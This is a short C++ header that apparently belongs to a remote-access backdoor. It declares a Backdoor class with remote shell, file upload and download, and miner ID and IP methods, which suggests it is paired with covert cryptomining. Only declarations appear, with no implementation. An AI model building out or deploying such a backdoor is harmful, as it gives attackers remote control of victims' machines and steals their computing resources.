#ifndef BACKDOOR_H
#define BACKDOOR_H

#include "communication.h"

class Backdoor{
public:
    void shell();
    void upload(const char *);
    void download(const char *);
    std::string get_miner_id();
    std::string get_miner_ip();
    void menu();
    Backdoor(int, Communication *, bool, char *);

private:
    Communication * c;
    bool is_server;
    int sock;
    char * client_ip;
    char * miner_id;
};


#endif